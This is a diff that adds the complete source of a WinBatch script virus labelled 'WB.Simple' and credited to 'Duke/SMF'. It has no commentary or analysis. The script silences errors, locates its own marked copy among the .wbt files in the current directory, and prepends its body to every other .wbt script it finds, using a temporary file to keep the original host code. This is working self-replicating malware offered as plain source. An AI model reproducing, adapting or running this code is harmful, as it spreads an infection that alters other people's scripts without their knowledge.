@@ -1,0 +1,42 @@
+;WB.Simple
+;(c) by Duke/SMF
+IntControl(29, @tab, 0, 0, 0)
+ErrorMode(@OFF)
+Viral = ""
+AllWBT = FileItemize("*.wbt")
+For i = 1 to ItemCount(AllWBT, @tab)
+   OneWBT = ItemExtract(i, AllWBT, @tab)
+   Size=FileSize(OneWBT)
+   MarkBuffer = BinaryAlloc(Size+100)
+   BinaryRead(MarkBuffer, OneWBT)
+   If BinaryPeekStr(MarkBuffer, 0, 10) == ";WB.Simple" then
+      Viral = OneWBT
+      Break
+   End If
+Next i
+If Viral != OneWBT Then EXIT
+For w = 1 To ItemCount(AllWBT, @tab)
+   OneWBT = ItemExtract(w, AllWBT, @tab)
+   Size=FileSize(OneWBT)
+   MarkBuffer = BinaryAlloc(Size+100)
+   BinaryRead(MarkBuffer, OneWBT)
+   If BinaryPeekStr(MarkBuffer, 0, 10) == ";WB.Simple" then Goto Infected
+   FileCopy(OneWBT,"C:\TEMP.WBT",0)
+   virus = FileOpen(Viral, "READ")
+   host = FileOpen(OneWBT, "WRITE")
+   While @TRUE
+      x = FileRead(virus)
+      FileWrite(host, x)
+      If x == "EXIT ;SIMPLE" Then Break
+   EndWhile
+   FileClose(virus)
+   FileClose(host)
+   temp = FileOpen("C:\TEMP.WBT", "READ")
+   Size=FileSize("C:\TEMP.WBT")
+   MarkBuffer = BinaryAlloc(FileSize("C:\TEMP.WBT")+100)
+   BinaryRead(MarkBuffer, "C:\TEMP.WBT")
+   BinaryWriteEx(MarkBuffer, 0, OneWBT, 1258, Size)
+   FileDelete(temp)
+:Infected
+Next w
+EXIT ;SIMPLE
